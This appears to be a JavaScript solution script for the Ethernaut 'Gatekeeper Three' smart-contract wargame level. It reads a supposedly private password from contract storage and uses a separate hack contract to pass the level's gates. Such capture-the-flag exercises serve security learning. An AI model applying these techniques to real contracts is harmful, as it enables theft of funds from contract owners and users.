const debug = require('debug')('attack:gatekeeper_three');

module.exports = async function({ artifacts, web3, ethernaut }) {
  const levelAddress = await ethernaut.createInstance('Gatekeeper Three');
  debug('Created instance at', levelAddress);

  const GatekeeperThree = artifacts.require('GatekeeperThree');
  const levelInstance = await GatekeeperThree.at(levelAddress);
  await levelInstance.createTrick();

  const password = await web3.eth.getStorageAt(await levelInstance.trick(), 2);
  await levelInstance.getAllowance(password);
  
  const GatekeeperThreeHack = artifacts.require('GatekeeperThreeHack');
  const hackInstance = await GatekeeperThreeHack.new();
  await hackInstance.hack(levelInstance.address, { value: web3.utils.toWei('0.002', 'ether') });

  return ethernaut.submitInstance(levelAddress);
};